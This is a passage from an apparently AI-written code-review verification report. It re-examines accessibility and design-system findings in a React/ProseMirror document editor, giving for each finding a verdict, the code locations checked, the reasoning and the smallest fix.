For the three frozen ones, the page already says the document is frozen:
- The header Save button next to them reads "Frozen" (`docSealed ? 'Frozen'`, 3326).
- The section view shows a `role="status"` banner, "This document is frozen… cannot be edited" (3747-3754).
- The document view shows " · frozen" (3458).

Only "File to vault" relies on its title alone for the reason. The masthead does say "unsaved changes — on this device only" (3667-3668), but "the vault files the saved document" appears only in the title. Screen-reader users can still hear a disabled button's title in browse mode. The people actually affected are sighted keyboard users and touch users.
**If confirmed, the smallest correct fix:** Show File to vault's reason on screen, either in its label ("Save to file") or in a short note beside it. The three frozen buttons need no change; the report's per-button fixes for them are unnecessary.

## Verification of A-A-4
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. It is a real WCAG 2.2 AA 2.5.8 failure at desktop width on the icon-only Move up / Move down pair: 12×12 px, touching each other, and with no other control that does the same thing. Most of the text `.nda-open` buttons probably pass under the spacing exception, so the failure is narrower than "~26 sites".
**What I checked:**
- Every `nda-open` rule in `client/src` CSS: `app-v2.css:83`, `2625-2626`; `authoring-v2.css:1552-1710` and `2029-2090` (both are `max-width:760px` blocks); `journey-v2.css:432` (disabled state only).
- Global button rules in `index.css:494-505`, and the coarse-pointer rules in `app-v2.css:213,227,377`; none of these target `.nda-open`.
- `icons.tsx:133`; `DocumentWorkbench.tsx:3598-3647`, and `2544-2556` / `3623` / `3632`, the only way to reorder sections.
**Why:**
- The base button rule sets `padding: 0` (`app-v2.css:83`). `.nda-open` sets `font-size:11.5px` and `svg{width:12px;height:12px}` (2625-2626) and has no minimum size.
- Every rule that sizes it (`authoring-v2.css:1619-1625, 1688-1692, 2047-2049`) is inside `@media (max-width: 760px)`.
- The stylesheet's own note records these links measured at 17px tall (1614-1616).
- The Move pair (3617-3636) contains only the icons, so each is 12×12. JSX drops the whitespace between the two buttons, so they touch with 0px between them; the report's "separated by 4px" is the wrapper span's left margin.
- Because they touch, 24px circles centred on them overlap, so the spacing exception fails. There is no other reorder control, so the "equivalent" exception does not apply either.
- A text button such as Rename (~50px wide) only sticks out about 3.5px above and below its 24px circle, so it usually meets the spacing exception.
**If confirmed, the smallest correct fix:** Add a desktop floor scoped to this editor, and keep the 44px phone rule:

```css
.ed-doc .nda-open,
.ed-comments .nda-open {
  min-width: 24px;
  min-height: 24px;
  justify-content: center;
}
```

The report's other option, changing `.nda-open` in `app-v2.css`, would change the class on every surface that uses it.

## Verification of A-A-5
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. The only "has a draft" marker on the governed filing outline is invisible to everyone. It does not say anything false, and opening the node shows the real content.
**What I checked:**
- `DocumentWorkbench.tsx:2849-2924` (outline rows) and `3051-3068` (the comment dot).
- `authoring-v2.css:197-211`.
- Every `ed-dot` and `data-s` selector in `client/src` CSS. `mdx/app.css:886-891` is scoped to `.mdx-shell` and has no `ok` value. `app-v2.css:1169` `[data-s=ok]` applies only to `.pj-file-status`.
- `useFilingOutline.ts:44, 258-264`; `server/routes/c2c/documents.ts:344`; `__tests__/filingOutline.test.ts:154-172`.
- Git history: no `.ed-dot` rule for `ok` ever existed.
**Why:** The dot is `<span className="ed-dot" data-s="ok" title={node.status} />` (2920). `.ed-dot` sets only size and radius (197-202), and backgrounds exist only for `complete`, `review` and `draft` (203-211). The span is empty, so it paints a transparent 6×6 box. The tests check only the `nodeHasDraft` logic, never whether the dot renders.

The title fallback is also wrong in content, not just hard to reach. `node.status` is the governed store's status, which defaults to `'todo'` when the section is unwritten (`documents.ts:344`). So a section drafted only in this editor gets a "has a draft" dot whose title says "todo".
**If confirmed, the smallest correct fix:** The report's suggested `data-s="complete"` is the wrong value. It paints `--success`, so any text at all would show as "complete" on the governed outline. Instead:
- Use a value that means "drafted" (`draft`, or a new `.ed-dot[data-s='ok']` rule).
- Replace `title={node.status}` with visually hidden "has a draft" text inside the row button.
- If the colour alone is to carry the meaning, it needs 3:1 contrast. `--idle` (#b0aea5, `app-v2.css:26`) is only about 2.2:1 even against pure white.

---

## Verification of A-B-1
**Verdict:** PARTLY CONFIRMED

**Severity, as you would grade it:** medium. I reproduced the loss mechanism, but its only host is the MDX dossier drawer on the four device pathway surfaces. That drawer is outside the launch catalog, and in production LaunchScopeGate replaces it with the "Not in this release" panel. In production it is reachable only when the single navigation-verdict read fails open, or wherever launch scope is off. Even then a loss needs a failed or in-flight PATCH followed by a tab close or reload. It is not a launch blocker.

**What I checked:**
- **The save path.**
  - `PathwayPanes.tsx` 746–987: DossierDrawer, onCommitBody, DDSaveStatus and DDDocumentTab. Also 1090–1266: the host component and the drawer mount.
  - `useSectionSave.ts` in full.
  - `dossierStore.ts` 1–40, 280–320, 373–381 and 602–617.
  - `RichSectionEditor.tsx` 176–202, 450–545, 950–990, 1082–1232 and 1812–1885.
- **Guards that could have caught it.**
  - A grep of `client/src` for `beforeunload|pagehide|visibilitychange` finds only one listener, at RichSectionEditor.tsx:1200.
  - V2App, MdxSurfaceHost and PathwayPanes have no guard for unsaved work.
  - The other three hosts all pass `storageKey` with `autosaveMs={null}`: DocumentWorkbench.tsx:3785, EctdCoauthor.tsx:945 and ProtocolDevSection.tsx:163. PathwayPanes is the only autosave host and the only one without a device cache.
- **Reachability.**
  - `<DossierDrawer>` is mounted only at PathwayPanes.tsx:1255.
  - PathwayPanes is mounted only by K510Surface.tsx:755, PmaSurface.tsx:290, CerSurface.tsx:164 and IvdSurface.tsx:557.
  - Those four render only at MdxSurfaceHost.tsx:367–384, for `device-510k|pma|cer|diagnostics` (surfaceViews.ts:432–438).
  - `shared/constants/launch-scope.ts` 43–153 lists no device id.
  - `launch-scope.ts:28` reads `if (raw === '') return production ? 'on' : 'off';`.
  - `navigation-entitlements.ts:244, 266–270`: `applyLaunchScope` locks every surface outside the launch scope, the platform owner included. The catalog rows are at `20260810_reconcile_module_catalog.sql:254–257`.
  - `V2App.tsx:1221–1223` wraps the page body in `LaunchScopeGate`. `LaunchScopeGate.tsx:30` renders the children only when the verdict is not a launch-scope lock.
  - It fails open with no verdict: `navEntitlements.tsx:15, 126`, and `dataConnect.tsx:364–389` makes one fetch with no retry.
  - The API gate would not stop the save. `/api/c2c/documents` is claimed by `document-authoring` (ui-surface-registry.ts:242), so `launch-scope-api.ts:100` returns `'launch'`.
  - No deploy file sets LAUNCH_SCOPE_ENFORCE (`.env.example` mentions it only in comments). `docs/handoff/HANDOFF_DEVICE.md:220–228` records the device stream as paused outside the scope.
- **I ran it.** `<scratch>/verify-AB/host-onsave.mjs` mounts the real RichSectionEditor under jsdom with the drawer's props (`format="text" chrome="bare" autosaveMs={600}`, no storageKey). It uses a stand-in PATCH that takes 1.5 s and then fails.

  | Host shape | Unload guard armed while typing | While PATCH in flight | After PATCH failed |
  |---|---|---|---|
  | PathwayPanes (fire-and-forget) | true | **false** | **false** |
  | Compliant (await, throw on failure) | true | true | true |

**Why:**
- **The contract says reject on failure, but the type allows a plain void.** RichSectionEditor.tsx:182 says `/** Governed write-through. Throw/reject on failure — the footer reports it. */`. Line 194 declares `onSave: (…) => void | Promise<void>;`.
- **The host returns before the write settles.** PathwayPanes.tsx:978–980 is `onSave={(text) => { onCommit(text); }}`. That leads to :793, `void sectionSave.save(String(safeTarget.id), next);`.
- **So the save counts as confirmed immediately.** RichSectionEditor.tsx:1153–1157 runs `await onSave(serialized, systemReason); lastSavedRef.current = serialized; … setDirty(stillDirty);`. Then :1192, `if (!dirty || readOnly) return;`, removes the only unload prompt.
- **There is no device cache.** PathwayPanes.tsx:973–984 passes no `storageKey`, so :1084 returns early (`if (!storageKey) return;`). The component's own comment names this case at :1213–1214: a host that "sets `autosaveMs` without `storageKey` has no such net, and its last edits are lost with no notice anywhere."
- **The report overstates "without warning".** The drawer's status line reports the server's outcome: useSectionSave.ts:104 produces `Not saved — HTTP …`, rendered at PathwayPanes.tsx:929–934 with "your text is still here — retry by editing again". What is missing is the unload prompt. The server record is not altered; what is lost is the author's unsaved draft.
- **The report missed two things.**
  - **Remounts treat unsaved text as clean.** Any remount of the editor takes `value={body}` as its clean baseline (RichSectionEditor.tsx:535, 986–987). Remounts happen on drawer close/reopen (:784), on the Document/Attachments tab switch, and on a section switch (:868). `body` is the optimistic store copy written before the PATCH (:792). So after a remount, text that failed to save looks clean and has no unload guard.
  - **The status line is shared across sections.** There is one `useSectionSave` per drawer (:771), not one per section. After another section saves successfully, reopening the failed section shows "saved … version recorded with your name and reason" (:926) over text the server never received. By then `writeSectionBody` has also bumped the footer's `v{version}` (:881) and pushed a `section.edit` Activity entry for the refused edit (dossierStore.ts:299–318, 380).

**If confirmed, the smallest correct fix:** three changes, all in PathwayPanes.tsx.
1. **Store only after the server confirms.**
   - Make `onCommitBody` async: `const ok = await sectionSave.save(id, next); if (ok) DossierStore.writeSectionBody(…); return ok;`.
   - Delete the `if (next === body) return;` short-circuit. It compares against the optimistic copy, so with an awaited save it would report retyped text that never saved as saved. The editor already skips a no-op save against its own confirmed baseline (RichSectionEditor.tsx:1144).
2. **Propagate failure.** Use `onSave={async (text) => { if (!(await onCommit(text))) throw new Error('Not saved'); }}`.
3. **Pass a `storageKey`**, for example ``` `mdx-dossier:${documentId}:${target.id}` ```. That covers a drawer close after a failed save: doSave clears `pendingAutosaveRef` (:1143), so the unmount flush never retries. The restore notice also renders in bare chrome (:1873).

The report's fix covers only step 2, returning the boolean, and step 3, so it is incomplete:
- Without step 1, a remount still presents the failed text as clean.
- Step 3 does nothing on its own today. The false "success" path deletes the cache (:1161–1163). And the restore offer compares against `value` (:1099), which the optimistic write has already made equal to the cached text.

## Verification of A-B-2
**Verdict:** PARTLY CONFIRMED

**Severity, as you would grade it:** low. The literal claim holds: there is no keyboard route from an anchor to its thread. But the pointer route it is compared against never fires on anchored text for anyone, because ProseMirror passes `handleClickOn` the enclosing paragraph. So the gap specific to keyboard users is limited to clicks that land on an inline node inside a commented range. For everyone else, the rail's keyboard-operable "Comments" then "Show in text" route is the working path. The dead pointer path underneath is a separate functional defect, which I would grade medium.

**What I checked:**
- `commentAnchor.ts` in full.
- RichSectionEditor.tsx:
  - 228–237 and 775–777: the comments contract and its wiring.
  - 1408–1413: `selectCommentAnchor`.
  - 1480–1491 and 1830: the canvas's only key handler, which covers Mod-S and Mod-F.
- A grep of the editor extensions for `addKeyboardShortcuts|keymap(` finds nothing.
- Only DocumentWorkbench passes `commentsApi` (3859–3861). Its `openCommentFromAnchor` is at 2221–2225.
- The comments rail:
  - The "Comments" `<button>` is at 3176–3186.
  - The per-thread "Show in text" `<button>` is at 4901–4915.
- `rich-section-editor.css:72` gives the anchor `cursor:pointer`.
- ProseMirror's click dispatch in `node_modules/prosemirror-view/dist/index.js` (version 1.42.4, the only copy):
  - 3465–3476: mouseup calls `handleSingleClick(view, pos.pos, pos.inside, …)`.
  - 3309–3313 and 3252–3262: `runHandlerOnContext`.
  - 517–518: `inside` comes from `nearestDesc(elt, true)`.
  - 873–885: `nearestDesc` skips entries that have no `.node`.
  - 1224–1229: MarkViewDesc sets `mark`, not `node`.
- **I ran it.** Two scripts in the same scratchpad folder, `verify-AB/anchor-click.mjs` and `anchor-click-atom.mjs`, use the repo's own `CommentAnchor` and `CrossReference` extensions with StarterKit. They compute `inside` the way posAtCoords does and run a verbatim copy of `runHandlerOnContext`.
  - A click on commented plain text offers the handler a `paragraph` with marks `[]`. It is not handled and `onAnchorClick` is never called.
  - A click on a cross-reference inside the commented range offers `crossReference`. It is handled and `onAnchorClick` fires.

**Why:**
- The report's quote is accurate. commentAnchor.ts:115–121 reads `handleClickOn(_view, _pos, node, …, direct) { if (!direct || !opts.onAnchorClick) return false; const mark = node.marks?.find(…'commentAnchor');`.
- The canvas's only key handler, RichSectionEditor.tsx:1480–1491, handles `(e.metaKey || e.ctrlKey)` with `'s'` and `'f'` only.
- The anchor's `<span>` is not a node entry, so ProseMirror passes the paragraph. The paragraph carries no inline marks, so line :117 finds nothing.
- So the contract at RichSectionEditor.tsx:232, "A click on annotated text — open the thread in the host's rail", is not met for mouse users either. Meanwhile `cursor:pointer` still advertises it.
- No test exercises this path; a grep for `onAnchorClick|rse-comment-anchor` in tests finds nothing.
- The workaround the report only presumed is real and works from the keyboard. DocumentWorkbench.tsx:4904–4906 runs `setFocusedCommentId(c.id); const found = editorRef.current?.selectCommentAnchor(c.id);`. That focuses the canvas and selects the range (RichSectionEditor.tsx:1412).

**If confirmed, the smallest correct fix:** in `commentAnchor.ts`, fix the pointer path and give the keyboard the same lookup.
- Replace `handleClickOn` with `handleClick(view, pos)`. Read the mark from `doc.resolve(pos).marks()` plus `doc.nodeAt(pos)?.marks`, then call `onAnchorClick`.
- Add `addKeyboardShortcuts()` with a dedicated chord that runs the same lookup at `selection.$head` and returns false outside an anchor.

Two parts of the report's fix are wrong:
- **Enter is the wrong key.** Enter with the caret inside annotated prose is how an author splits that paragraph, so binding it would break editing inside every commented range.
- **A keyboard route alone is not enough.** It would give keyboard users an action that mouse users still cannot perform.

## Verification of A-B-3
**Verdict:** CONFIRMED

**Severity, as you would grade it:** low. The role over-promises: assistive technology announces a link whose activation only selects the node. But the marker's text is announced either way, including the explicit unresolved statement. Nothing governed is hidden or misstated, and the fix is a one-line deletion per file.

**What I checked:**
- `crossReferenceNode.ts` in full, and `citationNode.ts` 190–294.
- A grep of both files for `href|tabIndex|tabindex` finds only comments about parse priority (citationNode.ts:197, crossReferenceNode.ts:113).
- `rich-section-editor.css:83–88`.
- The canvas root at RichSectionEditor.tsx:876–880 has `role: 'textbox', 'aria-multiline': 'true'`.
- prosemirror-view `dist/index.js:1319` gives any leaf node view without `contentDOM` `contentEditable = "false"`.
- The tests `crossReferences.test.tsx` and `citationsInCanvas.test.tsx` never query the link role.
- The node view rendered in my simulation as `<a class="rse-xref" role="link" data-xref="s1" data-missing="1" title="…">[Cross-reference unresolved — …]</a>`.

**Why:**
- crossReferenceNode.ts:155–158 reads `const dom = document.createElement('a'); … // Not a navigation: clicking a reference in the canvas places the caret. dom.setAttribute('role', 'link');`. citationNode.ts:242–245 is identical.
- Neither element has an href, tabIndex, key handler or click handler. Each node view returns only `dom`, `update` and `destroy` (crossReferenceNode.ts:189–199, citationNode.ts:281–291).
- The code's own comment says it is not a link, while the role says it is.
- The report's "not in the tab sequence" point does not apply inside a contenteditable, where the canvas is a single tab stop.
- The real effect: in browse mode, a screen-reader user sees these in the links list, and activating one does nothing. In focus mode, they hear "link" for plain reference text.

**If confirmed, the smallest correct fix:** delete `dom.setAttribute('role', 'link')` at crossReferenceNode.ts:158 and citationNode.ts:245. An `<a>` without href is then generic, and its text reads inline. The report's alternative, `tabIndex={0}` so that Tab and Enter behave as the role promises, is wrong:
- These node views are non-editable islands inside ProseMirror's editable root. Making each one focusable would add tab stops inside the canvas.
- It would also pull DOM focus off the editor, which breaks caret and selection handling.
- There is no navigation target for Enter to activate.

---

## Verification of A-C-1
**Verdict:** REFUTED
**Severity, as you would grade it:** n/a (no defect). On keyboard focus the Accept checkbox already gets the shell's 2px focus ring.
**What I checked:** First, a note that applies to all eight blocks. Every file cited below is byte-identical at `7087f46e2` and in the working tree (`git diff --stat 7087f46e2 -- <files>` is empty). A concurrent session's commit `10ad41a2` and its uncommitted `ProtocolDev.tsx`/test edits touch none of them. Bare `.tsx` names are in <repo>/client/src/concept2cure/v2/surfaces/ and bare `.css` names are in <repo>/client/src/concept2cure/v2/styles/.

For this finding:
- ProtocolDevDerivation.tsx:150–270 and :353–457. The checkbox renders inline in the pane via `BucketGroups` at :440, with no portal.
- app-v2.css:80–95, and protocol-dev-editing.css in full.
- A rule-by-rule scan of every CSS file under client/src, including nested rules, for `input`/`:focus` selectors that zero the outline. I also grepped for `appearance` and for `label … input` selectors.
- The mount path: <repo>/client/src/concept2cure/v2/V2App.tsx:78 imports app-v2.css and :1161 is the `c2c-v2` root (no portal); <repo>/client/src/concept2cure/v2/surfaceViews.ts:330 is the only mount.
- `git log -S` on the restoring rule.

**Why:** The report says the global restore covers "button and select (app-v2.css:84,94) but none for bare input". In fact lines 92–94 are one rule whose selector list starts with input:
- `.c2c-v2 input:focus-visible,` (app-v2.css:92)
- `.c2c-v2 textarea:focus-visible,` (:93)
- `.c2c-v2 select:focus-visible { outline: 2px solid var(--accent-200); outline-offset: 2px; … }` (:94)

The rule was added in e128a656 (2026-09-22), an ancestor of `7087f46e2`. Its own comment (:86–91) says it exists because the reset at :85 stripped every field's focus ring. At specificity (0,2,1) it beats the reset `.c2c-v2 input, … { … outline: 0; }` (:85, specificity (0,1,1)).

No more-specific rule reaches `<input type="checkbox" checked={checked} aria-label={label} … />` (ProtocolDevDerivation.tsx:173). Every outline-zeroing input rule in the repo is scoped to another class (`.tb-field`, `.cl-field`, `.pv-gcell`, `.pj-input`, `.fc-search`, …).

The ring is #ad5132, which is 4.98:1 on bg-000 (<repo>/design-system/colors_and_type.css:96). It reaches 4px out, inside the row card's 10px padding, so `.pj-card{…overflow:hidden}` (journey-v2.css:94) does not clip it. The report is right that `.pde-rowbtn:focus-visible` (protocol-dev-editing.css:58) sits on the label, but that doesn't matter.
**If confirmed, the smallest correct fix,** n/a. The report's proposed `.pde-rowbtn input:focus-visible` rule would only duplicate app-v2.css:92–94.

## Verification of A-C-2
**Verdict:** CONFIRMED
**Severity, as you would grade it:** medium. The selected tab is shown visually but exposed to no assistive technology (WCAG 1.3.1 / 4.1.2, Level A). There is a workaround: each pane's `<h2>` tells the user where they are once they move into it.
**What I checked:**
- ProtocolDevWorkspace.tsx:41–73 (16 TABS entries) and :295–301 (`TabStrip`).
- ProtocolDevWorkspace.tsx:357–380. `TabStrip` is used only at :366, with no wrapper semantics and no focus move or live announcement on a switch.
- ProtocolDevShared.tsx:33–48 (`PaneHead` h2) and research-v2.css:116–120.
- <repo>/client/src/concept2cure/quality/App.tsx:295–306 (the existing tablist pattern).
- Role, name and state computed with dom-accessibility-api, using the script named in A-C-5.

**Why:** The strip is `<div className="pd-tabs">{TABS.map((t) => (<button key={t.id} className={'pd-tab' + (tab === t.id ? ' on' : '')} onClick={() => onTab(t.id)}>` (ProtocolDevWorkspace.tsx:297–298). The only carrier of "current" is `.pd-tab.on{color:var(--accent-200);border-bottom-color:var(--accent-100);font-weight:600;}` (research-v2.css:119).

The computed result is the same for the active and an inactive button: role `button`, names "Document" and "Objectives", and no `aria-selected`, `aria-current` or `aria-pressed`. Separate tab stops are normal for plain buttons; the defect is only that the state is not exposed.
**If confirmed, the smallest correct fix,** add `aria-current={tab === t.id ? 'true' : undefined}` to each `.pd-tab` button.

The report's tablist fix is also correct, but only if it is done completely, as quality/App.tsx:295–306 does:
- `role="tab"` with `aria-selected`
- a roving `tabIndex`
- Arrow, Home and End keys
- a `role="tabpanel"` around `TabBody`

Adding `role="tab"` and `aria-selected` alone would announce a tab widget whose keyboard behaviour isn't there. The outline's active `.pd-tree-row.on` (ProtocolDevPanes.tsx:53) has the same unexposed state and takes the same one-attribute fix.

## Verification of A-C-3
**Verdict:** PARTLY CONFIRMED
**Severity, as you would grade it:** low. The facts hold: it is a `div role="button"` with no `aria-label`. But no success criterion fails. It has a role, a name from content, an `aria-expanded` state, Enter/Space activation and a visible focus ring. This is native-element hygiene, not a barrier.
**What I checked:**
- ProtocolDevRegisters.tsx:1–13 (the row deliberately holds no nested control), :56–84, :86–120 and :123–170.
- research-v2.css:233–237 and ProtocolGov.tsx:66–69.
- The computed name and role for a closed and an open row.

**Why:** The report's facts are right. The row has `role="button" tabIndex={0} aria-expanded={open}` plus an Enter/Space handler (ProtocolDevRegisters.tsx:94–101), and no aria-label.

But role=button takes its name from content. The computed name is the row's own text: score, hazard, status, category, inherent and residual rating. That is informative, not empty or misleading. It grows by the mitigation and owner text only while the row is expanded (:112–116). Focus is visible: `.pd-risk:focus-visible{outline:2px solid var(--accent-200)…}` (research-v2.css:236). The report itself concedes the row is operable and named.
**If confirmed, the smallest correct fix,** optional: switch to `<button type="button">`. The report's version is incomplete in two ways:
- The row's children are `<div>`s (:103, :107, :113, :115). A `<button>` may only contain phrasing content, so they must become `<span>`s.
- Its suggested `Risk: ${hazard}, score …` label puts the visible hazard mid-name and drops the status and residual rating. Any aria-label should begin with the visible hazard text (WCAG 2.5.3).

Rendering the mitigation outside the button, linked with `aria-controls`, would stop expansion from rewriting the button's name.

## Verification of A-C-4
**Verdict:** PARTLY CONFIRMED
**Severity, as you would grade it:** low. The mismatch is real, but "Reason for change" starts both the visible label and the accessible name. The command a speech user would give therefore still targets the field. I could not establish an actual 2.5.3 failure.
**What I checked:**
- ProtocolDevSection.tsx:195–217 and ProtocolDevSoa.tsx:256–272.
- research-v2.css:202–204 and protocol-dev-editing.css:43–48: nothing hides the visible label.
- The computed accessible names.

**Why:** `aria-label` does win over the wrapping `<label>`. The computed names are:
- "Reason for change, required before saving the section", against the visible "Reason for change (governed) — required before the section can be saved" (ProtocolDevSection.tsx:209 vs :214).
- "Reason for change, required before editing the schedule of assessments", against the visible "Reason for change (governed) — required before the grid can be edited" (ProtocolDevSoa.tsx:262 vs :267).

The visible label's leading text is at the start of the accessible name, which is what W3C's guidance on 2.5.3 recommends. What differs is the parenthetical "(governed)" and the trailing instruction, not the words a user would speak to reach the field.
**If confirmed, the smallest correct fix,** delete both `aria-label`s (ProtocolDevSection.tsx:214, ProtocolDevSoa.tsx:267). The wrapping label then supplies the visible text word for word. The report's fix is right.

## Verification of A-C-5
**Verdict:** CONFIRMED, and the naming problem is worse than reported.
**Severity, as you would grade it:** medium. Every cell is operable and its `aria-checked` state is correct. But a ticked cell's accessible name is the glyph "✕", and the assessment and visit drop to a description, which some screen-reader settings do not speak.
**What I checked:**
- ProtocolDevSoa.tsx:134–227 and research-v2.css:183–207.
- Role, name and description for a ticked and an unticked cell, computed with the repo's dom-accessibility-api 0.5.16. Its list of roles named from content includes checkbox, matching ARIA 1.2 ("Name From: contents, author").
- The script is <scratch>/verify-ac/accname.cjs. It changes nothing in the repo.

**Why:** Each cell is `<td … role="checkbox" aria-checked={on} … title={str(a.label) + ' · ' + str(v.label) …}>{on ? <span className="pd-soa-x">{'✕'}</span> : null}</td>` (ProtocolDevSoa.tsx:200–212), inside a plain `<table className="pd-soa">` (:185). Computed results:
- **Unticked cell:** the name is "12-lead ECG · Week 12", from the title fallback, as the report says.
- **Ticked cell:** the name is "✕" and the description is "12-lead ECG · Week 12". For a checkbox, content takes precedence over `title`; the report missed this.

The ARIA in HTML spec allows no role but `cell` on a `td` whose table is exposed as `table`. So the override is non-conforming, and row/column header association for table-navigation commands is not guaranteed. I did not check that in a live screen reader.
**If confirmed, the smallest correct fix,** keep the `<td>` a plain cell and put the control inside it. For example, a child `<span role="checkbox" aria-checked={on} aria-disabled={!editable} aria-label={a.label + ', ' + v.label} tabIndex={…}>` or a native checkbox, with the ✕ marked `aria-hidden`. Keep the click handler on the whole cell so the 34px pointer target doesn't shrink.

The report's first option, `aria-label` on the `td`, fixes the name in both states but leaves the non-conforming role override. Its alternative, a control nested in an unmodified `td`, is the right one.

## Verification of A-C-6
**Verdict:** PARTLY CONFIRMED
**Severity, as you would grade it:** low. Complete and draft differ only by the dot's colour. But the report's "cannot tell them apart without opening each section" is overstated. The finalization gate directly under the tree names every required section that is not complete, and its status, in visible text. Only optional sections and row-by-row scanning rely on colour alone.
**What I checked:**
- ProtocolDevPanes.tsx:37–68 and ProtocolGov.tsx:82–137.
- <repo>/server/services/protocol-development/protocol-development-logic.ts:119–135 and <repo>/server/services/protocol-development/pdev-view-assembler.ts:496–503 and :580 (where the completeness findings come from).
- research-v2.css:122–137, and app-v2.css:808 (`.sr-only` really is visually hidden).
- <repo>/design-system/colors_and_type.css:181, :183, :426 and :428, with relative luminance computed.

**Why:** Each row carries `<span className="pd-tree-dot" data-status={str(s.status)} aria-hidden="true" />` and `<span className="sr-only">{str(s.status)}</span>` (ProtocolDevPanes.tsx:56–57).
- Complete is `background:var(--success)` and draft is `background:var(--warning)`, both filled 8px circles (research-v2.css:131–132).
- #5e6d49 against #955d22 is 1.03:1 in luminance, and also 1.03:1 in dark mode, so hue is the only cue.
- Not started is a hollow ring (:133), so it is distinguishable.

However, the message `Required section "${s.title}" is ${s.status.replace('_', ' ')}.` (protocol-development-logic.ts:134) is shown as visible text. It renders through `<FindingsList findings={findings} dense />` (ProtocolGov.tsx:128) inside `.pd-outline-gate` (ProtocolDevPanes.tsx:63–66), in the same column as the tree.
**If confirmed, the smallest correct fix,** add a shape cue to the dot, such as a ring with a centre point for draft or a check glyph for complete; the report's fix is fine. Also make the `sr-only` text readable: it currently reads the raw value "not_started". `PG.labelize` (ProtocolGov.tsx:47) converts it.

## Verification of A-C-7
**Verdict:** CONFIRMED
**Severity, as you would grade it:** low. The "low" flag is only a hue shift, with no text, icon or screen-reader equivalent. But the total itself is visible text, and the under-3 threshold is an unexplained client-side rule, not an engine finding, so no governed information is hidden.
**What I checked:**
- ProtocolDevSoa.tsx:183–227 and research-v2.css:208–210.
- surface-text-ramp.css:357 (the `--text-300` value on this surface), and colors_and_type.css:79 and :183.
- <repo>/server/services/protocol-soa/protocol-soa-logic.ts:70–100.

**Why:** The cell is `className={'pd-soa-tot' + (total < 3 ? ' low' : '')}>{total}` (ProtocolDevSoa.tsx:222) with `.pd-soa-tot.low{color:var(--warning);}` (research-v2.css:210). That colour is the only difference from `.pd-soa-tot{…color:var(--text-300);}` (:209). #686660 against #955d22 is 1.06:1 in luminance, so the difference is hue alone.

The engine's findings under the grid cover only visits with no assessments at all (`Visit "…" has no scheduled assessments.`, protocol-soa-logic.ts:81). No text anywhere carries the under-3 flag.
**If confirmed, the smallest correct fix,** as the report says: a visible marker that is not colour, with text. For example, `{total}{total < 3 && <span> · low<span className="sr-only"> (fewer than 3 assessments)</span></span>}`. Also state the threshold once, because sighted users are not told what the amber means either.

## Verification of A-C-8
**Verdict:** CONFIRMED for the paired visit-header buttons. The row-header remove button passes.
**Severity, as you would grade it:** medium. It is a WCAG 2.2 AA failure (SC 2.5.8) on the only controls that rename or remove a visit. It is mitigated because each button opens a governed drawer that requires a reason and can be cancelled, and keyboard use is unaffected.
**What I checked:**
- ProtocolDevSoa.tsx:134–176 and ProtocolGov.tsx:52–63.
- protocol-dev-editing.css:52–58 and :103–111; research-v2.css:185–194; app-v2.css:82–83 and :164.
- A search for any min-width or min-height target rule that reaches these buttons; there is none.
- Every caller of `visit-rename` and `visit-remove`. These buttons are the only ones, so the "equivalent control" exception doesn't apply.
- ProtocolDevForms.tsx:72–87.

**Why:** `.pde-soa-vh .pde-rowbtn,.pde-soa-rh .pde-rowbtn{padding:2px 4px;line-height:0;}` (protocol-dev-editing.css:104) applies on top of `.pde-rowbtn{display:inline-flex;…border:1px solid transparent…}` (:52–55). Inside is an icon box of `width: s, height: s`, which is 12px (ProtocolGov.tsx:58). That makes each button 12+8+2 = 22px wide and 12+4+2 = 18px tall. `.pde-soa-vh{…gap:1px…}` (:103) puts the two centres 23px apart, so their 24px circles intersect and the spacing exception fails.

The report's lower-confidence row-header case (ProtocolDevSoa.tsx:170–174) passes on spacing:
- It is a single target, pinned right with at least 12px of `th` padding before the first cell (research-v2.css:191).
- Rows are at least 34px tall (:194).

So no other target falls inside its 24px circle.
**If confirmed, the smallest correct fix,** either of these:
- **`padding:5px` on `.pde-soa-vh .pde-rowbtn`:** each button becomes 12+10+2 = 24×24. The pair then measures 49px, which fits the 64px minimum column (research-v2.css:187), so the grid doesn't widen.
- **`gap:3px`:** keeps the current size and qualifies under the spacing exception.

The report's fix is right; its row-header caveat can be dropped.

---

## Verification of DS-1
**Verdict:** PARTLY CONFIRMED. The literal is real, the fallback is dead, and the fallback colour is not in the palette. The medium grade does not hold up, and neither does the "narrow trigger with a named precedent" reason given for it.

**Severity, as you would grade it:** low. The fallback cannot render in any supported state. In the one state where it can (the entry stylesheet fails to load and every canonical token disappears at once), it puts a 7% tint on a comment row and says nothing about any governed record. That is polish. It is also how this repo's own reviews graded the same class of defect: "low" in `2026-09-22` item #2 and "advisory" in `2026-09-24` G5.

**What I checked:** Paths are relative to `<repo>/` at `7087f46e2`. `git diff` shows none of these files changed at the current HEAD, `185bbbb0`.
- `client/src/concept2cure/v2/editor/DocumentWorkbench.tsx:4770-4810`: the row and its branch. A hex search of the whole file finds only :3693 and :4791.
- Every declaration of `--accent-100`:
  - `client/src/index.css:100-102` (`:root`, entry chunk)
  - `v2/styles/app-v2.css:19-21` (`:root`) and `:48,62` (`.c2c-v2.dark`)
  - `pdev/app.css:50` and `mdx/app.css:23` (the same alias)
- `design-system/colors_and_type.css:21,84` (`:root`) and `:281-282,350` (`.dark, [data-theme="dark"]`).
- How the stylesheets load: `client/src/main.tsx:27-35`, `v2/V2App.tsx:78,117`, `router/ZenRouter.tsx:44` (lazy V2App), and `vite.config.ts:74`, which has a single entry `client/index.html`.
- Whether the row can render outside the token scope: no `createPortal`, `window.open`, `<iframe>`, `outerHTML`/`innerHTML`, print or shadow root in `DocumentWorkbench.tsx`, `surfaces/AuthoringExports.tsx` or `surfaces/AuthoringAiDraft.tsx`.
- The guard on the named precedent: `tests/ui/token-authority.test.ts:167-172`. It runs through `npm test` (`package.json:77`, `.github/workflows/ci.yml:1116`).
- The gates:
  - `scripts/ci/check-phantom-tokens.mjs:5-6,35-38`. I ran it with `--list`, read-only: 9 tokens and 53 sites, and neither token is listed.
  - `check-design-system-compliance.mjs:13-16`.
  - `check-token-cascade.mjs:1-12`.
- The rules: `design-system/CLAUDE.md:17,45,60` and `design-system/SKILL.md:24`.
- Earlier reviews: `docs/evidence/reviews/2026-09-22/design-system.md:45-48` and `2026-09-24/design-system.md:58,68`.
- Related rules and render sites: `v2/styles/surfaces-v2.css:306-308` (`.cmt` rules), `v2/styles/authoring-v2.css:308-317`, and the `.ed-full-sec` render at `DocumentWorkbench.tsx:3487`.

**Why:**
